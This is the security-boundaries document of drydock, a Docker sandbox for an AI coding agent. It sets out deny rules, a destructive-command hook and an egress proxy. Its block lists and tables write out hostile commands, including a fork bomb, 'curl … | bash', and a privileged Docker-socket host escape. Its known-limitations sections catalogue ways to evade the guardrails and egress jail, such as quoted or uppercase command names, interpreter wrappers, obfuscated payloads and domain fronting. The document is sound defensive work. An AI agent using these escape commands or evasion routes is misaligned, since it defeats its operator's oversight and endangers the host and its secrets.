# Security boundaries — be honest with yourself

drydock's threat model is **defense against agent accidents, not against an
adversarial agent**. Read this so you don't develop a false sense of security.

## What drydock DOES protect against

- **`rm -rf ~/.ssh` typo** — the path isn't mounted into the container. The
  agent literally cannot see it.
- **`rm -rf /` accidental** — the container's `/` is the container's
  ephemeral root, not the host's. Blast radius = the container.
- **Read of `~/.aws/credentials`, `~/.gnupg/`, `~/.kube/`, etc.** — not
  mounted.
- **Self-modification of hook scripts** — the hooks directory is RO
  bind-mounted; the agent can read its guardrails but not edit them.
- **Weakening of the `permissions.deny` block or hook entries** —
  drydock's agent policy is delivered as Claude Code managed-settings drop-ins baked
  into the image at `/etc/claude-code/managed-settings.d/`. The files are root-owned;
  the non-root container user cannot write to `/etc/`. Claude Code loads managed
  settings at highest precedence and the rules cannot be weakened from project-level
  settings. The protection is structural, not advisory — it is not possible for an
  agent to overwrite these policy files from inside the container.
- **Damage to other projects under `~/`** — only `$PROJECT_DIR` is mounted by
  default; sibling projects are not visible unless explicitly added via
  `drydock link`. Linked siblings mount read-only (`:ro`) — writes are
  blocked at the filesystem level, not just by policy.
- **Credential read inside a linked sibling** — three cooperating layers
  protect credentials in any linked sibling. See the
  [dedicated walkthrough below](#credential-protection-in-linked-siblings).
- **Destructive commands (accident class)** — see the section below.

## Credential protection in linked siblings

When a sibling project is mounted via `drydock link`, three cooperating layers
defend against credential exposure. They are ordered outside-in — each layer
catches what the previous one missed.

### Layer 1 — link-time host-source guard

Before any mount is written, `lib/commands.sh` rejects host paths that **are**
credential directories or anything strictly under them:

- `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.docker` (and any subdirectory)

The guard uses separator-anchored prefix matching so that `~/.ssh-backup` is
**not** rejected (a common false-positive risk with naive prefix checks). If the
path passes the guard, it is not a credential dir — credentials never get linked
in the first place. This is defense-in-depth for [INV-1](../CLAUDE.md).

### Layer 2 — read-only bind mount

Every linked sibling is mounted `:ro` by default. Even if a sibling's tree
happens to contain a `.env` file with database credentials or a `.pem` key, the
container cannot write to it. Writes are blocked at the OS layer by the
bind-mount flag — not by policy alone — so this protection holds regardless of
whether the agent attempts an explicit write or a tool that opens a file for
writing.

**RW exception.** When a sibling is linked with `drydock link --rw`, it is
mounted `:rw`. The accident surface changes: the agent CAN write to (and
delete from) the sibling tree. The credential-directory guard (Layer 1) and the
deny rules (Layer 3) still apply, but there is no filesystem-layer write block.
This is the intended tradeoff for enabling `git push` workflows inside the
container. Only link `:rw` when you need write access to that sibling.

### Layer 3 — `//**/`-anchored deny rules in `00-secrets.json`

Claude Code's permission engine evaluates the deny rules in
`templates/managed-settings.d/00-secrets.json` (image-baked, root-owned, not
overridable from project settings) **before** any tool executes. The credential
patterns use root-anchored `//**/<path>` globs:

```
Read(//**/.ssh/**)
Read(//**/.aws/**)
Read(//**/.gnupg/**)
Read(//**/.kube/**)
Read(//**/.docker/config.json)
Read(//**/.claude/.credentials.json)
Read(//**/.claude-container*/.credentials.json)
Read(__HOME__/.config/drydock/**)
Read(//**/.env)
Read(//**/.env.local)
Read(//**/.env.production)
Read(//**/.env.development)
Read(//**/.env.test)
Read(//**/.env.staging)
# Edit(...) and Write(...) variants present for every entry — see 00-secrets.json
```

**Why explicit `.env*` variants instead of a `.env.*` glob.** `.env.example`,
`.env.template`, and `.env.sample` are conventional template files that should
remain readable — they hold variable names and dummy values, not secrets. A
glob like `Read(//**/.env.*)` would also block those templates and break a
common onboarding flow. Enumerating the secret variants individually keeps
the templates accessible. If your project uses an unusual `.env`-style name
(e.g. `.env.private`), add a project-level deny in `.claude/settings.json`.

The `//**/` prefix matches **at any mount depth**: a `.ssh/` directory inside a
sibling at `/workspace-siblings/other-repo/.ssh/` is denied by the same rule
that would deny `~/.ssh/` on the primary project or anywhere else in the
filesystem.

**`__HOME__`-anchored entry.** `__HOME__/.config/drydock/**` uses an
`__HOME__`-anchored pattern (resolved to `/home/<user>/.config/drydock/**`
at image build time) rather than the root-anchored `//**/` form. This is
intentional: drydock-state paths only need to be denied under the container's
`$HOME`, not at arbitrary mount depths. The distinction mirrors the threat
model — credential files like `.ssh/` can appear anywhere in a sibling tree,
but drydock-state paths are only meaningful under `$HOME`.

**Read/Edit/Write symmetry.** All three verbs are denied for each credential
path — not just `Read`:

- `Read` prevents exfiltration.
- `Edit` and `Write` prevent accidental overwrite or corruption of credential
  files (threat model A, [INV-7](../CLAUDE.md)) — for example, an agent that
  tries to "update" a `.env` file it mistook for project config cannot silently
  corrupt a `.docker/config.json` that happens to live in the sibling tree.

**The `.claude-container*` glob is load-bearing.** It covers both the legacy
single-session `.claude-container/` directory and the per-session
`.claude-container-<disc>/` directories introduced by concurrent-sessions
support in v0.2.0 (see [INV-2](../CLAUDE.md)). Without the `*` glob, per-session
credential files (`.claude-container-<disc>/.credentials.json`) would be
uncovered — a gap identified and closed in the v0.2.0 re-verify.

### RW links and the keys directory — expanded surface

When `drydock link --rw` is used, drydock mounts the **entire**
`~/.config/drydock/keys/` directory `:ro` into the container. This is necessary
so the managed SSH config can reference any sibling deploy key by absolute path.
Previously (RO-only links) only the primary project's deploy key was mounted.

**Surface expansion.** The blast radius of an accidental Bash read command goes
from one key file to all deploy keys under `~/.config/drydock/keys/`. A
command like `cat ~/.config/drydock/keys/*_deploy` to debug something would
expose every sibling's private key in one shot.

**Defense-in-depth.** `00-secrets.json` (image-baked, root-owned) now includes
`Bash(...)` deny patterns covering the most common read commands (`cat`, `less`,
`more`, `head`, `tail`, `od`, `xxd`, `strings`, `bat`, `rg`, `nl`, `tac`)
targeting that path. `bat` and `rg` are explicitly covered because drydock's
global agent convention prefers `bat`/`rg` over `cat`/`grep`; failing to deny
them would leave a normal-tool-usage hole (`rg . <key-file>` dumps content just
as effectively as `cat`). `nl` and `tac` are covered for the same reason — both
read file content line by line (`nl` numbers lines, `tac` reverses them).
Under Threat Model A (accidents — INV-7) this is sufficient: the deny rules
block inadvertent tool invocations. They do NOT block every conceivable
reading mechanism (`python`, `dd`, `awk`, `perl`, custom scripts, etc.) — a
determined adversary is explicitly out of scope.

**If you need stricter isolation:** do not enable the SSH overlay
(`docker-compose.ssh.yml`). RO-only links mount no key material at all.

### Per-sibling deploy key lifecycle (INV-1 supplement)

`drydock link --rw` generates one ed25519 key pair per sibling basename at
`~/.config/drydock/keys/<basename>_deploy{,.pub}`. Scope, lifecycle, and INV-1
alignment:

- **One key per sibling basename.** Keys are scoped by `basename`, not by host
  path or project. If two different projects link siblings with the same basename
  (e.g. both link `~/projects/shared-lib`), there would be a key-scope collision —
  drydock prevents this with a cross-project basename scan
  (`_check_sibling_basename_collision_rw` scans ALL `*.list` files, not just the
  current project's) and rejects the second link at the point of collision.

- **Key generation is idempotent.** If a key already exists at the expected path,
  `drydock link --rw` reuses it. Running `link --rw` a second time does not
  generate a new key or invalidate the GitHub deploy key registration.

- **Key stays on disk after `drydock unlink`.** drydock does NOT delete the key
  pair on unlink. A deploy key registration on GitHub would become orphaned with
  no warning if the local file were deleted. Instead, `drydock unlink` prints a
  dual-sided hint: (1) the local file path to `rm` if you no longer need the key,
  and (2) the GitHub URL to revoke the deploy key registration. drydock cannot
  revoke GitHub deploy keys remotely — both steps require a manual decision.

- **INV-1 alignment.** All per-sibling key material stays under
  `~/.config/drydock/keys/` — the same subtree as the primary project deploy key
  and GPG signing key. The `__HOME__/.config/drydock/**` deny rule in
  `00-secrets.json` already covers all per-sibling keys with no extension needed.

### Upstream enforcement caveat

drydock ships the deny rules; **Claude Code is the enforcer**. If an agent
bypasses Claude Code's permission gate — via a raw Docker socket call, a
sub-shell not mediated by the Bash tool, or a base64-obfuscated tool invocation
— the deny rules do not fire. This is the same non-goal stated in [INV-7](../CLAUDE.md)
for destructive commands: drydock defends against accidents, not against an
adversarial agent that is actively trying to circumvent its own permission layer.

## Host token passthrough (`GITHUB_PERSONAL_ACCESS_TOKEN`)

drydock's `docker-compose.yml` forwards `GITHUB_PERSONAL_ACCESS_TOKEN` from
the invoking shell into the container so the GitHub MCP server and `gh` PAT
authentication work end-to-end:

```yaml
environment:
  - GITHUB_PERSONAL_ACCESS_TOKEN
```

The key-only form is intentional under [INV-7](../CLAUDE.md) (threat model A —
accidents, not adversaries): the token is the user's own, on the user's own
machine, and normal drydock operation (`drydock run`, `compose up`) never
prints it. drydock itself does not invoke `docker compose config` (verified —
no occurrence in `bin/`, `lib/`).

Any invocation of `docker compose config` (and its alias `docker compose
convert`, and any piping of its output) resolves the env passthrough and
renders the token in plaintext. If you need to debug the rendered config (or
pipe it to a tool that does), **always pass `--no-interpolate`**:

> **Note:** `--no-interpolate` requires Docker Compose v2.2 or later.

```bash
# UNSAFE — prints the token value:
docker compose config

# SAFE — renders the structure with `${VAR}` placeholders unresolved:
docker compose config --no-interpolate
```

This is a zero-cost mitigation already supported by `docker compose`; no
drydock change required. The structural alternative most often suggested —
an `env_file` — has worse exposure properties than the current approach: the
token would persist on disk, be discoverable via `find`, and not be scoped to
the shell session. Docker secrets were evaluated and deferred; under threat
model A the documented-and-flagged debug step already neutralizes the hazard.

## Claude OAuth token (`docker-compose.oauth.yml`)

When `drydock setup-token` is run, the resulting token is written to
`~/.config/drydock/claude-oauth-token` with mode `0600`. This token grants
approximately **1 year of Claude account access** — treat it as a high-value
secret, at the same tier as a GitHub personal access token.

### Mitigations in place

| Mitigation | Detail |
|---|---|
| `0600` permissions | `umask 077` is set before `mktemp` so the temp file is created `0600` by intent; `mv -f` then atomically replaces the destination — never world-readable, not even transiently |
| Location under `~/.config/drydock/` | Already covered by the image-baked deny rule `Read(__HOME__/.config/drydock/**)` in `00-secrets.json`. The agent inside the container cannot read the file via Claude Code's Read tool. |
| Env-var-only delivery | The token value reaches the container exclusively as `CLAUDE_CODE_OAUTH_TOKEN` via the compose overlay. No bind-mount of the token file is ever created (SP-1 in the spec). |
| No agent-path exposure | `docker-compose.oauth.yml` has no `volumes:` block — the file never appears at a path inside the container. |
| Staleness warning | `drydock doctor` checks the token file's mtime; once the file is over 330 days old it shows a `⚠` row instead of `✓`, pointing at `drydock setup-token --force` to refresh. This gives ~35 days of runway before the ~1-year token expires. |

### docker inspect renders the token in plaintext

`docker inspect <container>` outputs the container's full `Env[]` array, which
includes `CLAUDE_CODE_OAUTH_TOKEN` in plaintext. Do not pipe `docker inspect`
output to logs or paste it in support requests.

### Revocation is two-step

`drydock revoke-token` removes the local file and deactivates the overlay for
future sessions. The token itself remains valid server-side until revoked at
claude.ai → Settings. Always do both steps to fully revoke.

### Under the hood

`export_compose_env()` reads the token file once per invocation, exports
`DRYDOCK_OAUTH_TOKEN_VALUE`, and `compose_files()` includes the overlay only
when that var is non-empty. The overlay injects the value as
`CLAUDE_CODE_OAUTH_TOKEN` — Claude Code picks it up at precedence level 5
(above `.credentials.json`), so sessions start without a browser login prompt.

## Destructive-command guardrail layer (v0.2.0+)

drydock ships a two-tier defense against accident-class destructive commands.
Both tiers are image-baked and tamper-proof.

### Tier 1 — declarative deny (`permissions.deny`)

Most rules ship as `Bash(...)` wildcard patterns in root-owned managed-settings
drop-ins. Claude Code evaluates the deny list **before** any hook runs —
matching commands are blocked at the framework level before execution.

| Drop-in file | What it covers |
|---|---|
| `10-git-safety.json` | Protected-branch delete/rename (8 branches × 6 flag forms), history-rewrite (`push --mirror`, `filter-branch`, `update-ref -d`), remote-delete refspecs, GitHub destructive ops (`gh repo delete/archive/transfer`, `gh release delete`, `gh api DELETE refs/heads/*`) |
| `30-os-safety.json` | `rm -rf` to system paths, `find / -delete`, disk-destruction tools (`dd`, `mkfs`, partition tools, `wipefs`), sudo + destructive verb (incl. `sudo chown -R`, account ops `userdel` / `usermod --lock`, `systemctl stop`/`disable`/`mask`/`reset-failed`, `init 0`), package-manager purge/remove, kernel module teardown, firewall flush, `crontab -r`, `kill -9 1`, `docker system/volume prune`, redirect to block devices or critical `/etc` files, `docker run --privileged` / `docker run -v /:` (host-root bind) |
| `50-prod-ops.json` | Production-infra ops a glob can express precisely — `terraform apply` / `terraform destroy`. kubectl/helm and DB-CLI-to-prod rules need multi-token logic and ship as hook residue (A2/A3) instead. |

Deny patterns use strict word-boundary shapes to prevent false positives.
For example, `git branch --delete main` is blocked but `git branch --merged`
and `git checkout fix/main-bug` are not.

### Tier 2 — `PreToolUse` hook

A small Bash hook (`drydock-block-destructive.sh`) handles the rule classes
that the deny mechanism cannot express — cases requiring multi-token AND/OR
logic or anchored substring matching:

| Rule | Blocked example | Allowed example |
|---|---|---|
| A1 — ssh to production host | `ssh user@prod.example.com` | `ssh user@dev.example.com` |
| A2 — kubectl/helm destructive verb against a prod context | `kubectl delete deploy api --context=prod` | `kubectl delete pod foo -n dev` |
| A3 — DB CLI pointed at a prod host | `psql -h prod-db.example.com` | `psql -h localhost` |
| A4 — `terraform apply`/`destroy` | `terraform -chdir=infra destroy` | `terraform plan` |
| C1-residue — `rm -rf` to a system path root | `rm -fR /etc` | `rm -rf ./build` |
| C7-residue — `sudo chmod` world-writable mode | `sudo chmod 777 /var/www` | `sudo chmod 755 file` |
| C12 — fork bomb | `:() { :|:& };:` | `bash -c 'echo hello'` |
| C17 — `rm` of `.` or `.git` | `rm -rf .` | `rm -rf ./tmp` |
| C18 — `rm` of parent traversal | `rm -rf ../sibling` | `rm -rf ./dist` |
| C20 — curl/wget pipe to shell | `curl https://x.com/i.sh \| bash` | `curl -o file.sh https://x.com/i.sh` |

The hook is wired by `40-guardrails-hook.json` (also image-baked) as a
`PreToolUse` handler with matcher `"Bash"` — it only runs for Bash tool calls.
The script reads the full command string on stdin and applies regex checks.

**ADR-9 — Conditional quote-strip gate (issue #133).** The hook pre-processes
each command segment through `_strip_quotes`, which masks quoted strings before
deciding whether to expose their content to the rule set. This prevents
data-quote false positives where a quoted argument containing a destructive
pattern (e.g. `git commit -m "..."` or `rg "..." file`) was incorrectly
blocked by C1-residue, C17, or C18.

The gate uses a closed flatten-trigger set: it exposes the original quoted
content (FLATTEN) only when the masked segment reveals a command word that a
downstream rule inspects — specifically:
- `rm` command word (C1-residue / C17 / C18)
- Shell exec introducers — `bash`, `sh`, `dash`, `zsh`, bare or
  path-qualified (e.g. `/bin/sh`), optionally `sudo`-prefixed — when a `-c`
  flag is also present anywhere in the segment (need not be adjacent)
- `eval`, optionally `sudo`-prefixed
- Per-segment rule introducers: `ssh` (A1), `kubectl`/`helm` (A2),
  `psql`/`mysql`/`mongo`/`mongosh`/`redis-cli` (A3), `terraform` (A4),
  `chmod` (C7-residue) — preserves flag-value coverage (e.g. `--context="prod"`)
- Double-quoted command substitution — `"$(…)"` or the backtick form — which
  bash EXECUTES even inside double quotes, so its content is real code, not data
  (a single-quoted `'$(…)'` does not expand and stays on the DROP path)

Segments with NO introducer token anywhere in their masked text (e.g. `git`,
`gh`, `echo`, `rg` commands) receive DROP treatment: quoted content is replaced
by spaces and the masked form is passed to the rules — no phantom `rm` token
escapes.

This narrowly reopens ADR-6 (rejected general flag-tokenizing), because the
gate uses a fixed introducer set only to decide strip behavior, not to
parse per-command flags. For the DROP gate the change is monotonic: exposed
text per segment is always ≤ the shipped unconditional flatten, so the gate
introduces no new false positives (only BLOCK→ALLOW flips are possible, and the
flip audit closes all accident-class flips). Rule loops C1-residue, C17, and
C18 are unchanged.

**ADR-9 follow-up — C12/C20 routed through the masked form (issue #143).**
C12 (fork bomb) and C20 (`curl`/`wget` piped to a shell) historically scanned
the raw command string, so a benign commit message or search pattern that
merely CONTAINED the dangerous shape — `git commit -m "use curl x | bash"`, an
agent's own `rg "curl|bash" logs/`, or a commit documenting `:(){ :|:& }` — was
over-blocked. Both rules now scan `_scrubbed_cmd`: the `;`-joined concatenation
of the per-segment masked forms. Data quotes are DROPPED; executor and
command-substitution content is FLATTENED. Real execution forms still block —
bare `curl … | bash`, `sh -c "curl … | bash"`, docker-wrapped `sh -c`, bare
`$(curl … | bash)`, and double-quoted `"$(curl … | bash)"` — because the masked
form preserves them.

The DROP gate gains one deliberate **cmdsub arm** for this: a double-quoted run
carrying command substitution (`"$(…)"` or the backtick form) is FLATTENED, not
dropped, because bash executes it even inside double quotes — dropping it would
let `echo "$(curl … | bash)"` slip past C20 (a bypass). A single-quoted
`'$(…)'` does not expand and correctly stays on the DROP path. This arm is the
one exception to the gate's monotonicity: it can over-block the rare case where
a double-quoted command substitution carries a destructive token as literal
DATA (e.g. `git commit -m "$(echo rm -rf /)"`). That trade is intentional —
under threat model A an over-block is tolerable, a missed real `curl | bash` is
not.

**Docker exec/run coverage.** The hook checks the full command string
regardless of a leading `docker exec <ctr>` or `docker run [opts] <image>`
prefix — dangerous substrings (`rm -rf`, `:(){:|:&};:`, `curl … | bash`, etc.)
are present in the full string whether or not the command is docker-wrapped.
This provides accident-class coverage for simple docker-wrapped invocations.

**Hard boundary (non-goal per INV-6 and INV-7).** Command-string inspection
raises the accident floor; it is NOT an adversarial ceiling. A raw Docker
socket call, the Docker SDK, a base64-obfuscated payload, or `docker exec`
reading the command from a file all bypass string inspection. Adversarial
container-escape via the Docker socket remains a documented non-goal —
the socket is root-equivalent by design and drydock's threat model is
accidents, not adversaries. See "What drydock does NOT protect against" below.

### Known limitations

- **B3 non-origin remotes.** `Bash(git push origin :*)` blocks refspec-delete
  for `origin` only. `git push upstream :main` (non-origin remote) is not
  covered. Under threat model A this is an acceptable documented gap — pushing
  a delete refspec to a non-origin remote is not an accident-shaped action in
  typical workflows.
- **C7 sudo rules are defense-in-depth only.** The default drydock image does
  not install `sudo` (verified — no `sudo` in the Dockerfile apt list;
  `no-new-privileges:true` would make it a no-op anyway). The `sudo + verb`
  deny entries in `30-os-safety.json` are dead weight against the default
  image. They are kept as a safety net for derived images where a user adds
  `sudo` — they do not protect against bypassing the deny layer itself.
- **Force-push via `+`-refspec not in deny matrix.** `git push origin +main`
  (force-push using a `+`-prefixed refspec rather than `--force`) is not
  currently covered by the deny layer. Under threat model A, using a
  `+`-refspec is not an accident-shaped action in typical workflows, but it
  is a documented gap. The protected-branch hooks (B4/B9) cover flag-based
  force-push forms; `+`-refspecs would require a separate pattern class.
- **Hook `rm` anchoring does not catch shell-metacharacter-glued targets.**
  The C1-residue, C17, and C18 hook rules use space as the token boundary
  before the target argument. A command like `$(rm -rf .)` or `rm${IFS}-rf .`
  would bypass the space-anchored regex. Accident-class typos do not produce
  these metacharacter-glued forms; this gap is documented for completeness
  under threat model A (accidents, not adversaries).
- **ADR-9 evasion class — quoted command name.** Quoting ANY introducer's
  command name masks it from the gate: `"rm" -rf /etc`, `"kubectl" delete pod x
  --context=prod`, `"psql" --host=prod-db`. In each case the masked segment
  contains no introducer token → the segment receives DROP treatment → the rule
  never fires → ALLOW. Distinguishing a quoted command name from a quoted data
  argument requires a real shell parser — exactly the ADR-6 arms race ADR-9 is
  designed to avoid. Deliberate construction, not an accident-class action.
  Documented non-goal.
- **ADR-9 evasion class — interpreter wrappers.** Commands such as
  `python -c "..."`, `perl -e "..."`, `ruby -e "..."`, or `node -e "..."`
  are not covered by the executor arm. The flatten-trigger set is shell-only
  by design; scripting language interpreters are out of scope.
- **ADR-9 evasion class — shells outside the closed introducer set.**
  `ksh -c "..."`, `csh -c "..."`, `tcsh -c "..."`, and `fish -c "..."` receive
  DROP treatment (quoted content masked away) because Part A only matches
  `{bash, sh, dash, zsh}`. These shells are uncommon in the minimal container
  image (absent = command-not-found, no harm), and expanding the set would
  reopen the ADR-6 arms race. The closed-set membership is ADR-9's standing
  decision.
- **ADR-9 evasion class — case-sensitivity divergence between gate and rules.**
  The gate matches introducer tokens case-sensitively (the `_strip_quotes`
  function runs in the main shell with `nocasematch` off). Rules A1, A2, and A3
  each run in a `(...)` subshell with `shopt -s nocasematch`. An uppercase
  introducer therefore falls through the gate (no case-sensitive match → DROP),
  while the quoted prod/host marker is also removed by masking, so the rule
  never sees either token: `SSH "prod-host" runit`, `KUBECTL delete pod x
  --context="prod"`, `PSQL --host="prod-db"` all ALLOW where the lowercase
  equivalents (with quoted markers) would have BLOCKed. This is evasion-class /
  deliberate-construction only: uppercase command names are not valid Linux
  commands (`SSH`, `KUBECTL`, `PSQL` → command-not-found, nothing executes),
  and the prod/host marker must be quoted to survive masking. Not an
  accident-class pattern. Documented non-goal. Note: `rm`, `terraform`, and
  `chmod` rules run in the main shell (case-sensitive, matching the gate), so
  there is no equivalent gap for those introducers.
- **ADR-9 over-block (tolerable) — quoted remote ssh payload.** Because `ssh`
  is in the flatten-trigger set (needed so A1 can inspect hostname and flag
  values), `ssh host "rm -rf /"` FLATTENs its quoted payload and is then
  BLOCKED by C1-residue (the `/` system-root token is now visible). This is an
  over-block, not an evasion: the command executes on a remote host, so there
  is no local-filesystem hazard. The monotonic direction is correct: tolerable
  false-positive rather than missed accident. By contrast, `ssh host "rm -rf
  /var/cache/x"` passes — the non-system-root path token does not match the
  C1-residue anchor. A1 continues to block ssh to any production host regardless
  of whether the remote payload contains a destructive command.
- **ADR-9 over-block (tolerable) — quoted data containing `;` / the canonical
  fork bomb (issue #143).** Segment splitting on `;`, `&&`, and `||` happens
  BEFORE quote masking, so quoted DATA that itself contains one of those
  separators is split mid-quote and the masking cannot neutralize it. A commit
  message carrying the literal canonical fork bomb `:(){ :|:& };:` (which
  contains a `;`), or `git commit -m "… curl x | bash; …"`, therefore still
  over-blocks via C12/C20 — the common no-`;` forms are fixed, this `;`-bearing
  residual is not. The monotonic direction is correct (over-block, not missed
  accident). A complete fix needs quote-aware segment splitting (split on
  `;`/`&&`/`||` only outside quotes), tracked in issue #143. Accepted under
  threat model A: an annoyance, not a hole.

### If you have a personal `block-destructive.sh` hook

Previous drydock guidance suggested adding a personal
`~/.claude/hooks/block-destructive.sh` on your host. Since v0.2.0, drydock
ships its own guardrail hook (`drydock-block-destructive.sh`) image-baked and
wired automatically. **You can safely delete your personal
`~/.claude/hooks/block-destructive.sh`** and rely on the shipped version —
it covers the same rule classes plus docker-wrapped variants.

The two scripts coexist without conflict (different filenames, different mount
points), so there is no urgency. But the personal copy is now redundant.

## Container hardening defaults (v0.1.1+)

drydock auto-applies a hardening overlay (`docker-compose.hardening.yml`) that bounds
accident-class privilege and resource use. These defaults are anchored as **INV-8** in
`CLAUDE.md` — they are project invariants, not per-release polish.

| Defense | Effect | Opt-out |
|---|---|---|
| `cap_drop: [ALL]` + minimum `cap_add` | Privileged syscalls return EPERM rather than completing silently (e.g. `mount -o bind` requires `SYS_ADMIN`; raw-socket `bind` requires `NET_RAW`; cross-uid `ptrace` requires `SYS_PTRACE`) | `DRYDOCK_NO_HARDENING=1` (nuclear) |
| `security_opt: no-new-privileges:true` | A setuid-root binary (`su`, `mount`, `passwd` — present in the base image) cannot re-acquire dropped caps; the cap drop cannot be bypassed via SUID escalation | `DRYDOCK_NO_HARDENING=1` (nuclear) |
| `tmpfs /tmp` with `size=1g` (default) | Runaway loops writing to `/tmp` halt at 1G instead of filling the host's memory-backed tmpfs | `DRYDOCK_TMPFS_SIZE=<size>` (granular) or `DRYDOCK_NO_HARDENING=1` (nuclear) |

The `cap_add` set — `DAC_OVERRIDE`, `CHOWN`, `FOWNER`, `SETUID`, `SETGID` — is the documented
minimum bounding set. With the container running as a non-root user and no file-cap'd binaries
in the image, these caps do NOT sit in the running process's effective set — they remain in the
bounding set so file-mode / ownership / uid-context operations function when invoked by tooling
that genuinely needs them (rsync `-a` preserving modes and uids, npm/pnpm post-install scripts
chmod'ing under `node_modules`, future file-cap'd binaries). Each entry has an inline rationale
in `docker-compose.hardening.yml`. Adding a cap MUST come with a new inline comment; removing
one requires reopening INV-8.

To opt out of all hardening for a single invocation:

```sh
DRYDOCK_NO_HARDENING=1 drydock
```

To tune the tmpfs size (granular — hardening otherwise active):

```sh
DRYDOCK_TMPFS_SIZE=4g drydock
```

These defenses defeat **accidents**, not adversaries. In dood mode the Docker socket mount
remains root-equivalent (see below) — INV-8 is additive defense in depth, not a replacement for
INV-6. In contained mode (the factory default) the socket is absent (INV-9).

## What drydock does NOT protect against

- **Adversarial agent using the Docker socket (dood mode only)** — in dood
  mode (opt-in), a process with `/var/run/docker.sock` access can run
  `docker run -v /:/host --privileged alpine sh` and then it's root on the
  host. The socket is root-equivalent (INV-6). Dood mode is the unchanged
  drydock posture (threat model A). In contained mode (the factory default)
  the socket is NOT mounted — this attack class is blocked. See INV-9 in
  CLAUDE.md for mode selection; to opt in run `drydock dood <proj>` (or set
  `DRYDOCK_DOOD=1`, or create `~/.config/drydock/dood/<proj>`).
- **Agent committing nonsense to the project tree** — `$PROJECT_DIR` is
  mounted RW. The agent can write anything in it. (That's the point — it
  needs to do its job.) Use git review discipline.
- **Agent reading arbitrary content inside `$PROJECT_DIR`** — the project
  tree is mounted RW and the agent can read any file in it for legitimate
  work. Drydock's `00-secrets.json` does cover the **common secret-file
  conventions** automatically: `.env`, `.env.local`, `.env.production`,
  `.env.development`, `.env.test`, `.env.staging`, plus `.ssh/**`, `.aws/**`,
  `.gnupg/**`, `.kube/**`, `.docker/config.json` at any mount depth — that's
  what the managed-settings layer ships, no per-user setup required.
  `.env.example` and similar template suffixes are intentionally NOT denied
  (they hold variable names and dummy values, not secrets). If your project
  stores secrets under non-conventional filenames (custom `.creds`,
  `.env.private`, etc.) add a project-level deny in `.claude/settings.json`.
- **Network exfiltration** — in dood mode (opt-in) the container shares the
  host's network namespace (`network_mode: host`) and the agent can make
  arbitrary outbound connections. In contained mode (the factory default) the
  container runs on an `internal: true` bridge with NO Docker socket and NO host
  networking — the socket-escape class and host-network reach are both removed —
  and egress is jailed behind a drydock-managed deny-by-default domain allowlist.
  The agent reaches the network only through a per-session allowlist proxy
  sidecar that permits CONNECT to allowlisted hostnames on port 443; a CONNECT to
  any other host returns 403. The shipped baseline (it carries `api.anthropic.com`
  and the other hosts Claude Code needs under drydock's default token auth —
  provisional, pending empirical capture before v0.4.0) is add-only — extend it with
  `~/.config/drydock/egress-allowlist` (global) or `egress-allowlist-<project>`
  (per-project); user files only ADD entries, they cannot weaken the baseline.
  This is L4 hostname-based filtering, not payload inspection — see the residual
  gaps below.

### Contained-mode egress jail: residual gaps

The contained-mode egress jail is deny-by-default L4 hostname-based egress
control, not an airtight boundary. Named, not hidden:

- **(a) L4 only** — the proxy filters on the CONNECT hostname; it does not
  inspect TLS payloads. Exfiltration THROUGH an allowed domain (e.g. a paste or
  gist service that happens to be allowlisted) remains possible.
- **(b) ECH / domain-fronting** — the proxy enforces the client-supplied CONNECT
  hostname, not the real TLS SNI. A request that fronts an allowed domain to
  reach a different origin cannot be detected at L4.
- **(c) IP-literal CONNECT** — a CONNECT to a raw IP address matches no host
  pattern and is denied by deny-by-default. Named here as both a residual path
  (no hostname to match) and the attack class the default-deny posture mitigates.
- **(d) Compromised sidecar = open egress** — if the proxy sidecar itself is
  compromised, egress is open. Mitigated, not eliminated, by a minimal hardened
  image with `cap_drop: ALL`, `no-new-privileges`, and no writable mount.
- **(e) Tools that ignore `HTTPS_PROXY`** — a tool that bypasses the proxy
  environment variables gets a DNS SERVFAIL on the internal bridge: breakage, not
  bypass. There is no NAT route off the internal network for it to use.
- **(f) dood mode is unchanged** — operators who opt into dood mode carry the
  full host blast radius (INV-6); the egress jail applies to contained mode only.
- **(g) Shared internal bridge** — concurrent contained sessions share one
  fixed-name internal bridge (Docker's `enable_icc` defaults on), so a payload in
  session A can reach a concurrent session B's proxy sidecar and egress through
  B's allowlist. Bounded to the union of live sessions' allowlists under
  single-user trust; isolating each session would reintroduce the network-leak
  hazard, so it is accepted and named rather than closed. Out of scope.

## If you need adversarial-resistant isolation

drydock as-is is the wrong tool for an adversarial threat model. Layer one of
these in front of the Docker socket and restrict the API surface:

- [`Tecnativa/docker-socket-proxy`](https://github.com/Tecnativa/docker-socket-proxy)
  — env-var-controlled allowlist of Docker API endpoints. Configure it to
  allow `containers/exec`, `containers/logs`, `containers/json` and deny
  `containers/create` with privileged/host-mount/network options.
- [`cetusguard`](https://github.com/cetusguard/cetusguard) — more expressive
  filtering.

Or go heavier: run the agent in a VM (no host kernel sharing), or use
gVisor/Kata containers (syscall isolation). All of these are out of scope for
drydock's current design — they're on the roadmap as opt-in for users with
that threat model.

## The honest framing

drydock **raises the cost of an accidental mistake** by an unsupervised AI
agent. It does **not guarantee impossibility** of harm. Use it the way you'd
use a circuit breaker — it stops the common failure mode, it doesn't make
the wiring adversary-proof.
